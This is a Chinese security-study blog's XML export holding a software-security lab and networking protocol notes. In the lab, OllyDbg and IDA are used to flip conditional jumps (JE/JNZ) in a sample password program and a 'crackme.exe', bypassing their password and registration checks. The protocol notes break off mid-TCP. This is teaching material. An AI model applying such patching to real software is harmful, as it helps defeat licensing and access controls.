<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20220912224336.png"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20220912224409.png"></p>
<p><strong>注：仅当作技术研究，请勿用于非法用途 后果作者概不负责！！！</strong></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞 用友NC</tag>
      </tags>
  </entry>
  <entry>
    <title>缓冲区溢出实验</title>
    <url>/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%AE%9E%E9%AA%8C.html</url>
    <content><![CDATA[<h1 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h1><ol>
<li>读懂并能够独立编写密码验证的小程序。 </li>
<li>运行 <code>Ollydbg</code>，并学习用其调试密码验证小程序。 </li>
<li>通过修改汇编语句来修改程序的判断条件，改变程序的运行路线。 <span id="more"></span></li>
</ol>
<h1 id="理解程序"><a href="#理解程序" class="headerlink" title="理解程序"></a>理解程序</h1><p>阅读并理解代码 </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PASSWORD <span class="string">&quot;1234567&quot;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">verify_password</span> <span class="params">(<span class="type">char</span> *password)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> authenticated;</span><br><span class="line">	authenticated=<span class="built_in">strcmp</span>(password,PASSWORD);</span><br><span class="line">	<span class="keyword">return</span> authenticated;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> valid_flag=<span class="number">0</span>;</span><br><span class="line">	<span class="type">char</span> password[<span class="number">1024</span>];</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;please input password:       &quot;</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,password);</span><br><span class="line">		valid_flag = verify_password(password);</span><br><span class="line">		<span class="keyword">if</span>(valid_flag)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;incorrect password!\n\n&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Congratulation! You have passed the verification!\n&quot;</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li>在主函数内输入密码<code>password</code>；</li>
<li>跳转到子函数<code>verify_password()</code>判断输入的密码是否正确即判断输入的密码<code>password</code>与正确的密码<code>PASSWORD</code>是否相等,如果相等则子函数返回0，否则返回非0；</li>
<li>主函数在判断子函数<code>verify_password()</code>返回值：如果是0，则输出<code>Congratulation! You have passed the verification!</code>，结束程序，否则输出<code>incorrect password!</code>，继续输入密码<code>password</code>重复上述过程。</li>
</ol>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565795262719.png" alt="1565795262719"></p>
<h1 id="调试程序"><a href="#调试程序" class="headerlink" title="调试程序"></a>调试程序</h1><ol>
<li><p>使用<code>Ollydbg</code>打开程序</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565795381042.png" alt="1565795381042"></p>
</li>
<li><p>同时按下<code>Alt</code>和<code>F9</code>执行到用户代码如下图：在地址为<code>00401614</code>处<code>CALL test.00401014</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565795418251.png" alt="1565795418251"></p>
</li>
<li><p>找到地址<code>00401014</code>处 <code>JMP test.main</code>，即此处向下为用户代码</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565795448209.png" alt="1565795448209"></p>
</li>
<li><p>分析用户代码，发现<code>00401030</code>至<code>0040106F</code>为子函数<code>verify_password()</code>反汇编代码，<code>00401080</code>至<code>0040111C</code>为<code>main</code>函数的反汇编代码</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565795482563.png" alt="1565795482563"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565795488088.png" alt="1565795488088"></p>
</li>
<li><p>分析反汇编代码，发现在<code>004010E1</code>处，出现指令<code>CMP </code>比较子函数的返回值与0，如果等于0，则执行接下来的<code>004010E5</code>处<code>JE SHORT test.00401105</code>处的指令，即打印<code>Congratulation! You have passed the verification!</code>；否则打印<code>incorrect password!</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565795609568.png" alt="1565795609568"></p>
</li>
<li><p>程序运行的结构图如下</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565795720516.png" alt="1565795720516"></p>
</li>
</ol>
<h1 id="修改程序"><a href="#修改程序" class="headerlink" title="修改程序"></a>修改程序</h1><p>已知：</p>
<table>
<thead>
<tr>
<th align="center">编码</th>
<th align="center">功能</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>JE</code></td>
<td align="center">等于则跳转</td>
</tr>
<tr>
<td align="center"><code>JNZ</code></td>
<td align="center">不等于则跳转</td>
</tr>
</tbody></table>
<p>地址<code>004010E5</code>处指令<code>JE SHORT test.00401105</code>表示<code>CMP</code>指令比较的两个数相同则跳转到地址<code>00401105</code>处，即打印<code>Congratulation! You have passed the verification!</code>，否则按地址顺序执行，即打印<code>incorrect password!</code></p>
<p>为此，我们将<code>JE</code>修改为<code>JNZ</code>并执行程序</p>
<ol>
<li><p>右键点击<code>JE</code>、找到二进制、点击编辑，或直接<code>Ctrl+E</code>，编辑代码，将<code>74</code>改成<code>75</code>，因为<code>74</code>代表<code>JE</code>，<code>75</code>代表<code>JNZ</code>，或直接双击<code>JE</code>更改该汇编语言由<code>JE</code>至<code>JNZ</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565797357774.png" alt="1565797357774"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565797362376.png" alt="1565797362376"></p>
</li>
<li><p>再次运行，当输入密码为<code>1234567</code>时显示<code>incorrect password!</code>，输入其它内容时直接退出程序。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565797406931.png" alt="1565797406931"></p>
</li>
<li><p>修改成功，即把结构中的选择语句中的N和Y调换位置</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565797422793.png" alt="1565797422793"></p>
</li>
</ol>
<h1 id="思考题"><a href="#思考题" class="headerlink" title="思考题"></a>思考题</h1><p>破解<code>crackme.exe</code>程序，要求通过修改程序代码的方式绕过<code>crackme.exe</code>的密码验证逻辑，至少采用<strong>2</strong>种破解方式方法。</p>
<ol>
<li><p>用<code>Ollydbg</code>打开<code>crackme.exe</code>文件</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565797561858.png" alt="1565797561858"></p>
</li>
<li><p>右键→查找→所有参考文本字串</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565797574854.png" alt="1565797574854"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565797587429.png" alt="1565797587429"></p>
</li>
<li><p>双击<code>ASCII ‘crackmepassword’</code>,跳转到文件汇编语言<code>crackmepassword</code>处找到四个条件选择语句</p>
</li>
<li><p>利用<code>IDA</code>打开<code>crackme.exe</code>文件，搜索字符串同样双击<code>ASCII ‘crackmepassword’</code>得到如下结果</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565797649027.png" alt="1565797649027"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565797665901.png" alt="1565797665901"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565797680979.png" alt="1565797680979"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565797701037.png" alt="1565797701037"></p>
</li>
<li><p>分析汇编指令可知<strong>必须让程序执行<code>00401616</code>处的指令而不能执行<code>00401637</code>处的指令</strong>。而在不知道密码的情况下会执行<code>0040161E</code>处的指令进行跳转，故要实现绕过密码登录就有需要不进行跳转，可以<strong>将<code>0040161E</code>处<code>JNZ</code>指令改为<code>JE</code>指令</strong>实现不跳转，该方法为方法一。</p>
</li>
<li><p>通过分析四条选择语句，得到结论如下</p>
<table>
<thead>
<tr>
<th align="center">地址</th>
<th align="center">是否跳转</th>
</tr>
</thead>
<tbody><tr>
<td align="center">004015F1</td>
<td align="center">JE不跳转</td>
</tr>
<tr>
<td align="center">004015F5</td>
<td align="center">JE不跳转</td>
</tr>
<tr>
<td align="center">00401601</td>
<td align="center">JNZ跳转</td>
</tr>
<tr>
<td align="center">0040160B</td>
<td align="center">JNZ跳转</td>
</tr>
</tbody></table>
<p>再次分析该部分程序只有程序在<code>004015F1</code>处不跳转、在<code>004015F5</code>跳转时，根据寄存器的值才能判断出程序在<code>0040161E</code>处不跳转即不执行<code>00401637</code>处指令，故方法二是<strong>将<code>004015F1</code>处<code>JNZ</code>指令改为<code>JE</code>指令，将<code>004015F5</code>处<code>JE</code>指令改为<code>JNZ</code>指令</strong>。</p>
</li>
<li><p>执行结果</p>
<ul>
<li><p>方法一</p>
<ol>
<li><p>将<code>JNZ</code>指令改为<code>JE</code>指令</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565798121426.png" alt="1565798121426"></p>
</li>
<li><p><code>右键单击→复制到可执行文件→所有修改→全部复制→右键单击→保存文件→选择文件路径</code>，将更改后的文件保存为<code>crackme1.exe</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565798154333.png" alt="1565798154333"></p>
</li>
<li><p>打开<code>crackme1.exe</code>，随便输入一个用户名和密码点击注册，显示注册成功</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565798200923.png" alt="1565798200923"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565798191459.png" alt="1565798191459"></p>
</li>
</ol>
</li>
<li><p>方法二</p>
<ol>
<li><p>将<code>004015F1</code>处<code>JNZ</code>指令改为<code>JE</code>指令，将<code>004015F5</code>处<code>JE</code>指令改为<code>JNZ</code>指令</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565798278535.png" alt="1565798278535"></p>
</li>
<li><p>与方法一相同，将更改后的文件保存为<code>crackme2.exe</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565798297876.png" alt="1565798297876"></p>
</li>
<li><p>打开<code>crackme1.exe</code>，随便输入一个用户名和密码点击注册，显示注册成功</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565798319089.png" alt="1565798319089"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565798324932.png" alt="1565798324932"></p>
</li>
</ol>
</li>
</ul>
</li>
</ol>
]]></content>
      <categories>
        <category>软件安全实验</category>
      </categories>
      <tags>
        <tag>缓冲区溢出</tag>
      </tags>
  </entry>
  <entry>
    <title>网络层、传输层、应用层常用协议</title>
    <url>/%E7%BD%91%E7%BB%9C%E5%B1%82%E3%80%81%E4%BC%A0%E8%BE%93%E5%B1%82%E3%80%81%E5%BA%94%E7%94%A8%E5%B1%82%E5%B8%B8%E7%94%A8%E5%8D%8F%E8%AE%AE.html</url>
    <content><![CDATA[<p>简单介绍网络层、传输层、应用层常用协议。<span id="more"></span></p>
<h2 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h2><h3 id="IP协议"><a href="#IP协议" class="headerlink" title="IP协议"></a>IP协议</h3><p>IP协议（InternetProtocol，互联网协议）</p>
<p>是TCP/IP协议栈中最核心的协议之一，通过IP地址，保证了联网设备的唯一性，实现了网络通信的面向无连接和不可靠的传输功能。</p>
<ol>
<li><p>协议头图解</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201022104317.png"></p>
<ol>
<li><p>Version（版本号）：IP协议版本号。目前只有两个版本：IPv4和IPv6</p>
</li>
<li><p>HeaderLength（IP协议头部长度）：IP协议头部的长度，单位字节（32bit）需要这个值是因为任选字段的长度是可变的，这个字段占4bit（最多能表示15个32bit的的字，即4*15=60个字节的首部长度），因此IP头部最多有60字节长度。正常的长度是20字节；如果有额外的IP的options选项，还得加上option的长度。</p>
</li>
<li><p>TypeofService(服务类型)：标示包传输优先级。总共8位，是由3个优先权位（不再使用），4个TOS位，1个固定的0组成。<br>4个TOS位：最新延迟、最大吞吐量、最高可靠性、最小成本，只能4选一。</p>
</li>
<li><p>TotalLength（包长度）：整个IP包的长度，16位，最大可以标示65536个字节，TotalLength-HeaderLength=数据长度。通过HeaderLength和TotalLength就可以知道数据的起始位置和结束位置。</p>
</li>
<li><p>Identifier（标识符）：网络中转发的IP报文的长度可以不同，但如果报文长度超过了数据链路所支持的最大长度，则报文就需要分割成若干个小的片段才能在链路上传输。比如以太网帧中数据最大长度（MTU）为1500字节，大于MTU的都会被分割，被分割的每个包都有相同的一个值，表示这是同一个ip包。</p>
</li>
<li><p>Flag（标志位）：标志字段在IP报头中占3位。</p>
<ul>
<li>第1位作为保留；</li>
<li>第2位，分段，是否允许分片;（如果不允许分片，包超过了数据连路支持的最大长度，则丢弃该包，返回发送者一个ICMP错误）</li>
<li>第3位，更多分段。表示是否最后一个分片。<br>当目的主机接收到一个IP数据报时，会首先查看该数据报的标识符，并且检查标志位的第3位是置0或置1，以确定是否还有更多的分段。如果还有后续报文，接收主机则将接收到的报文放在缓存直到接收完所有具有相同标识符的数据报，然后再进行重组。</li>
</ul>
</li>
<li><p>FragmentedOffset（偏移量）：当某个IP大包分成多片时，各个分片是不按顺序达到目的地的，IP包根据分片的偏移量进行重组包。（跟TCP原理一样）</p>
</li>
<li><p>（TimetoLive）生存时间：表示数据包经过的路由器个数。如果网络上有些路由器的路由表配置不合理，路由寻址可能会导致死循环，数据包会一直循环传输。IP包发送的时候可以设置一个TTL值，比如TTL=64，没经过一个路由器TTL减1，减到0还没到到目的地，路由器会抛弃这个IP包，并使用一个ICMP消息通知发送方。</p>
</li>
<li><p>Protocal（协议）：协议类型1：ICMP，2：IGMP，6：TCP，17：UDP。</p>
</li>
<li><p>HeaderCheckSum（首部校验和）：校验IP协议头，判断IP协议头是否正确传输。</p>
</li>
<li><p>SourceAddress（源IP）：请求方IP</p>
</li>
<li><p>DistinationAddress（目的IP）：响应方IP</p>
</li>
<li><p>Options（可选字段）：IP支持很多可选选项</p>
</li>
</ol>
</li>
</ol>
<h3 id="ICMP协议"><a href="#ICMP协议" class="headerlink" title="ICMP协议"></a>ICMP协议</h3><p>Internet Control Message Protocol，Internet控制消息协议</p>
<ol>
<li><p>介绍</p>
<ol>
<li>ICMP属于TCP/IP协议族，用于在IP主机、路由器之间传递控制消息。</li>
<li>控制消息是指网络通不通、主机是否可达、路由是否可用等网络本身的消息。这些控制消息虽然并不传输用户数据，但是对于用户数据的传递起着重要的作用。</li>
<li>ICMP协议与ARP协议不同，ICMP靠IP协议来完成任务，所以ICMP报文中要封装IP头部。它与传输层协议（如TCP和UDP）的目的不同，一般不用来在端系统之间传送数据，不被用户网络程序直接使用，除了想Ping和Tracert这样的诊断程序。</li>
<li>ICMP的主要作用是<strong>主机探测,路由维护,路由选择,流量控制</strong>。</li>
<li>ICMP只能搭配IPv4使用，如果是IPv6的情况下, 需要是用ICMPv6</li>
<li>ICMP报文通常被IP层或更高层协议(TCP或UDP)使用。<strong>ICMP报文是在IP数据报内部传输的</strong>。IP协议是不可靠协议，不能保证 IP数据报能够成功的到达目的主机，无法进行差错控制，当遇到IP数据无法访问目标、IP路由器无法按当前的传输速率转发数据包等情况时，会自动发送ICMP消息。</li>
</ol>
</li>
<li><p>ICMP报文格式</p>
<ol>
<li><p>ICMP报文包含在IP数据报中，IP报头在ICMP报文的最前面。一个ICMP报文包括IP报头（至少20字节）、ICMP报头（至少八字节）和ICMP报文（属于ICMP报文的数据部分）。当IP报头中的协议字段值为1时，就说明这是一个ICMP报文。ICMP报头如下图所示。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201022111023.png"></p>
<ol>
<li>类型：占8位</li>
<li>代码：占8位</li>
<li>检验和：占16位</li>
</ol>
<p>说明：ICMP所有报文的前4个字节都是一样的，但是剩下的其他字节则互不相同。其它字段都ICMP报文类型不同而不同。</p>
<p>ICMP报文的前4个字节是统一的格式，共有三个字段：即类型，代码和检验和。</p>
<ol>
<li>8位类型和8位代码字段一起决定了ICMP报文的类型。<ol>
<li>类型8，代码0：表示回显请求(ping请求)。</li>
<li>类型0，代码0：表示回显应答(ping应答)</li>
<li>类型11，代码0：超时</li>
</ol>
</li>
<li>16位的检验和字段：包括数据在内的整个ICMP数据包的检验和；其计算方法和IP头部检验和的计算方法一样的。</li>
</ol>
<p>ICMP报文具体分为<strong>查询报文</strong>和<strong>差错报文</strong>(对ICMP差错报文有时需要做特殊处理，因此要对其进行区分。如：对ICMP差错报文进行响应时，永远不会生成另一份ICMP差错报文，否则会出现死循环)</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201022112425.png"></p>
</li>
</ol>
</li>
<li><p>ICMP查询报文</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201022111910.png"></p>
<ol>
<li><p>ICMP询问报文有四种回送请求和回答，时间戳请求和回答，掩码地址请求和回答，以及路由器询问和通过。</p>
<ol>
<li>ICMP回送请求报文是由主机或路由器向一个特定的目的主机发出的询问。收到此报文的机器必须给源主机发送ICMP回送应答报文。这种询问报文用来测试目的站是否可达以及了解其有关状态。</li>
<li>ICMP时间戳请求允许系统向另一个系统查询当前的时间。该ICMP报文的好处是它提供了毫秒级的分辨率，而利用其他方法从别的主机获取的时间只能提供秒级的分辨率。请求端填写发起时间，然后发送报文。应答系统收到请求报文时填写接收时间戳，在发送应答时填写发送时间戳。大多数的实现是把后面两个字段都设成相同的值。</li>
<li>主机使用ICMP地址掩码请求报文可向子网掩码服务器得到某个接口的地址掩码。系统广播它的ICMP请求报文。ICMP报文中的标识符和序列号字段由发送端任意选择设定，这些值在应答中将被返回，这样，发送端就可以把应答与请求进行匹配。</li>
<li>主机使用ICMP路由器询问和通过报文可了解连接在本网络上的路由器是否正常工作。主机将路由器询问报文进行广播（或多播）。收到询问报文的一个或几个路由器就使用路由器通过报文广播其路由选择信息。</li>
</ol>
<p>ping使用的是ICMP的查询报文的请求和回答。</p>
</li>
</ol>
</li>
<li><p>ICMP差错报文</p>
<ol>
<li><p>ICMP差错报告报文共有5种</p>
<ol>
<li><p>终点不可达：终点不可达分为:网络不可达，主机不可达，协议不可达，端口不可达，需要分片但DF比特已置为1，以及源路由失败等六种情况，其代码字段分别置为0至5。当出现以上六种情况时就向源站发送终点不可达报文。</p>
<p>说明：端口不可达：UDP的规则之一是：如果收到UDP数据报而且目的端口与某个正在使用的进程不相符，那么UDP返回一个ICMP不可达报文。</p>
</li>
<li><p>源站抑制：当路由器或主机由于拥塞而丢弃数据报时，就向源站发送源站抑制报文，使源站知道应当将数据报的发送速率放慢。</p>
</li>
<li><p> 时间超过：当路由器收到生存时间为零的数据报时，除丢弃该数据报外，还要向源站发送时间超过报文。当目的站在预先规定的时间内不能收到一个数据报的全部数据报片时，就将已收到的数据报片都丢弃，并向源站发送时间超过报文。</p>
</li>
<li><p>参数问题：当路由器或目的主机收到的数据报的首部中的字段的值不正确时，就丢弃该数据报，并向源站发送参数问题报文。</p>
</li>
<li><p>改变路由（重定向）路由器将改变路由报文发送给主机，让主机知道下次应将数据报发送给另外的路由器。</p>
</li>
</ol>
</li>
<li><p>说明:</p>
<p>以下几种情况都不会导致产生ICMP差错报文</p>
<ol>
<li>ICMP差错报文（但是，ICMP查询报文可能会产生ICMP差错报文）</li>
<li>目的地址是广播地址或多播地址的IP数据报</li>
<li>作为链路层广播的数据报</li>
<li>不是IP分片的第一片</li>
<li>源地址不是单个主机的数据报。即源地址不能为零地址、环回地址、广播地址或多播地址。</li>
</ol>
<p>这些规则是为了防止过去允许ICMP差错报文对广播分组响应所带来的广播风暴。</p>
</li>
<li><p>所有的ICMP差错报告报文中的数据字段都具有同样的格式。将收到的需要进行差错报告IP数据报的首部和数据字段的前8个字节提取出来，作为ICMP报文的数据字段。再加上响应的ICMP差错报告报文的前8个字节，就构成了ICMP差错报告报文。提取收到的数据报的数据字段的前8个字节是为了得到运输层的端口号（对于TCP和UDP）以及运输层报文的发送序号（对于TCP）。一般情况下不发送ICMP差错报告报文。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201022111814.png"></p>
</li>
</ol>
</li>
</ol>
<h3 id="IGMP协议"><a href="#IGMP协议" class="headerlink" title="IGMP协议"></a>IGMP协议</h3><p>Internet Group Management Protocol，Internet组管理协议</p>
<ol>
<li><p>介绍</p>
<ol>
<li><p>IGMP也是IP协议的一个补充，位于TCP/IP体系中的网络层，是用于管理网路协议多播组成员的一种通信协议。</p>
</li>
<li><p>该协议用来在ip主机和与其直接相邻的组播路由器之间建立、维护<strong>组播组成员</strong>关系，但不包括组播路由器之间的组成员关系信息的传播与维护，这部分工作由各组播路由协议完成。所有参与组播的主机必须实现IGMP。</p>
</li>
<li><p>GMP目前有三个版本，目前用的最多的是IGMPv2。</p>
<ol>
<li>IGMPv1主要基于查询和响应机制来完成对组播组成员的管理；</li>
<li>IGMPv2增加了查询器选举机制和离开组机制；</li>
<li>IGMPv3在兼容和继承IGMPv1和IGMPv2的基础上，进一步增强了主机的控制能力，并增强了查询和报告报文的功能；</li>
</ol>
</li>
</ol>
</li>
<li><p>IGMP报文格式</p>
<ol>
<li><p>IGMPv1</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201022112834.png"></p>
<ol>
<li><p>4位版本：目前IGMP有V1，V2，V3三个版本，比如是V1则该4位为1， V3则该4位为3。</p>
</li>
<li><p>4位类型：成员关系查询0x11和成员关系报告0x12两种类型。</p>
</li>
<li><p>16位校验和：8个字节的校验码。</p>
</li>
<li><p>32位组地址：</p>
<ol>
<li>当发送报文是成员关系报告时，该32位组地址即组播组地址。     </li>
<li>当发送的报文是成员关系查询时，该32位为全0。V1版本只支持通用关系查询，不支持特定组查询。</li>
</ol>
</li>
</ol>
</li>
<li><p>IGMPv2</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201022113051.png"></p>
<ol>
<li>8位类型：有三种类型；<ol>
<li>成员关系查询0x11：在V2和V3中成员关系查询增加特定组查询：<ol>
<li>常规查询：用于确定哪些组播组是活跃的，即改组是否还有成员在使用，常规查询组地址由全零表示。</li>
<li>特定组查询：用于查询某具体组播组是否还有组成员。</li>
</ol>
</li>
<li>成员关系报告0x16（版本1成员关系报告0x12）；</li>
<li>离开组消息0x17；</li>
</ol>
</li>
<li>8位最大响应时间：以0.1秒为单位，默认值是100，即10秒。</li>
<li>16位校验和：报文段8个字节的校验码。</li>
<li>32位组地址：<ol>
<li>成员关系查询报文：常规查询组低位为全0，特定组查询则应设置对应的组地址；</li>
<li>成员报告或离开组消息：组地址为要报告或要离开的组地址；</li>
</ol>
</li>
</ol>
</li>
<li><p>三种协议比较</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201022113349.png"></p>
</li>
</ol>
</li>
<li><p>IGMP协议功能</p>
<ol>
<li><p>加入一个多播组</p>
<p>多播的基础就是一个进程的概念（使用的术语进程是指操作系统执行的一个程序），该进程在一个主机的给定接口上加入了一个多播组。在一个给定接口上的多播组中的成员是动态的，它随时因进程加入和离开多播组而变化。</p>
<p>这里所指的进程必须以某种方式在给定的接口上加入某个多播组。进程也能离开先前加入的多播组。这些是一个支持多播主机中任何API所必需的部分。使用限定词“接口”是因为多播组中的成员是与接口相关联的。一个进程可以在多个接口上加入同一多播组。</p>
</li>
<li><p>IGMP报告和查询</p>
<p>多播路由器使用IGMP报文来记录与该路由器相连网络中组成员的变化情况。使用规则如下：</p>
<ol>
<li>当第一个进程加入一个组时，主机就发送一个IGMP报告。如果一个主机的多个进程加入同一组，只发送一个IGMP报告。这个报告被发送到进程加入组所在的同一接口上。</li>
<li>进程离开一个组时，主机不发送IGMP报告，即便是组中的最后一个进程离开。主机知道在确定的组中已不再有组成员后，在随后收到的IGMP查询中就不再发送报告报文。</li>
<li>多播路由器定时发送IGMP查询来了解是否还有任何主机包含有属于多播组的进程。多播路由器必须向每个接口发送一个IGMP查询。因为路由器希望主机对它加入的每个多播组均发回一个报告，因此IGMP查询报文中的组地址被设置为0。</li>
<li>主机通过发送IGMP报告来响应一个IGMP查询，对每个至少还包含一个进程的组均要发回IGMP报告。</li>
</ol>
<p>使用这些查询和报告报文，多播路由器对每个接口保持一个表，表中记录接口上至少还包含一个主机的多播组。当路由器收到要转发的多播数据报时，它只将该数据报转发到（使用相应的多播链路层地址）还拥有属于那个组主机的接口上。</p>
<p>下图显示了两个IGMP报文，一个是主机发送的报告，另一个是路由器发送的查询。该路由器正在要求那个接口上的每个主机说明它加入的每个多播组。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201022113630.png"></p>
</li>
<li><p>离开报文（仅限IGMPv2和v3）</p>
<p>该报文由主机发出。当主机离开组播组时发送此报文，向组播路由器报告离开了特定的组播组。离开报文的目标IP为224.0.0.2（所有组播路由器），IGMP报头内的组播IP为特定离开组的IP。</p>
</li>
</ol>
</li>
<li><p>IGMP报文种类</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201022113714.png"></p>
</li>
</ol>
<h3 id="ARP协议"><a href="#ARP协议" class="headerlink" title="ARP协议"></a>ARP协议</h3><p>Address Resolution Protocol，地址解析协议</p>
<ol>
<li><p>功能：把网络层32位的IP转换成数据链路层48位的MAC地址，在这个过程中有一个很重要的表，<strong>ARP缓存表</strong>。该表的形式如下，也是一个映射；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201022114312.png"></p>
<p>对于ARP缓存表的使用，有两种情况</p>
<ul>
<li><p>ARP缓存表中<strong>有</strong>缓存IP地址和MAC地址的映射关系</p>
</li>
<li><p>ARP缓存表中<strong>没有</strong>缓存IP地址和MAC地址的映射关系</p>
</li>
<li><p><strong>如果有缓存的情况</strong>，就像上篇文章中介绍的步骤一样，A可以<strong>直接告诉</strong>数据链路层，E的MAC地址。A会查询ARP缓存表，查看E的MAC地址是什么，然后告知数据链路层。</p>
</li>
<li><p><strong>如果没有缓存的情况</strong>，ARP会<strong>广播某一个IP的信息</strong>，收到这个广播的设备会回应一个包，表示我是不是这个IP地址。如果是，广播该IP地址的设备会记录对应设备的MAC地址</p>
</li>
</ul>
<p>ARP缓存表是ARP协议和RARP协议运行的关键</p>
<ul>
<li>ARP缓存表缓存了<strong>IP地址到硬件地址之间的映射关系</strong>（在网络层进行数据转发的时候，需要数据链路层和物理层，因此网络层在进行数据发送的时候，首先需要通过ARP协议，把IP地址转化为MAC地址，然后告诉数据链路层，这时，数据链路层才能进行数据帧的传输）</li>
<li>ARP缓存表中的记录并<strong>不是永久有效的</strong>，有一定的期限（因为MAC地址是永久不变的，但是IP地址是会变化的）</li>
</ul>
</li>
<li><p>ARP报文格式</p>
<p>ARP协议的报文信息是<strong>直接封装到数据链路层的数据帧中</strong>的</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201022114813.png"></p>
<p>最上边为数据链路层的数据帧格式，中间是ARP协议的报文信息，PAD是填充的内容</p>
<p>虽然ARP协议是直接封装在数据链路层的数据帧中的，但ARP协议仍属于网络层，主要是因为ARP协议使用到了<strong>IP地址</strong>，所以它属于网络层的内容。所以ARP协议是数据链路层和网络层配合使用的一个协议。</p>
</li>
</ol>
<h3 id="RARP协议"><a href="#RARP协议" class="headerlink" title="RARP协议"></a>RARP协议</h3><p>Reverse Address Resolution Protocol，逆地址解析协议</p>
<p>和ARP协议做相反的工作，它是将48位的MAC地址转换为32位的IP地址</p>
<ol>
<li><p>RARP报文格式</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201022115058.png"></p>
</li>
</ol>
<h2 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h2><h3 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h3><p>Transmisson Control Protocol，传输控制协议</p>
<ol>
<li><p>介绍</p>
<ol>
<li>TCP协议为应用程序提供了稳定可靠的数据传输。它是一个滑动窗口协议，提供了超时和重传的处理。</li>
<li>TCP 是在两个端点之间建立的全双工虚拟连接。每个端点由 IP 地址和端口号定义。</li>
